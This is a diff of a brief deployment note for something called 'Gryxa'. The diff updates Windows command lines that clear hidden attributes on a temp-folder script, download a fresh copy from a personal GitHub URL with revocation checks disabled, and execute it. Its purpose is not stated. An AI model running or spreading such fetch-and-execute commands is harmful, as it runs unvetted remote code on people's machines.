@@ -1,8 +1,8 @@
-UNIVERSAL DEPLOY (O43 / M31 / L20 ? start Gryxa before rate-limit):
+UNIVERSAL DEPLOY (O44 / M32 / L20 ? stop Gryxa TG flood):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o43" & findstr /C:"OWN BUILD 20260802O43" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o44" & findstr /C:"OWN BUILD 20260802O44" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 SHA-pin:
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/a1b9953f4b9cf4a12616631a2e1974e46f4bd9ec/own.txt" & findstr /C:"OWN BUILD 20260802O43" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/8c40654557be1c41804003cc32ae4b9df6ad3475/own.txt" & findstr /C:"OWN BUILD 20260802O44" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-O43: -Deep always tries sc start/repair first; rate-limit only blocks msiexec churn.
+O44: per-Gryxa state + 24h RESTORED rate-limit. Alerts only on real recovery.
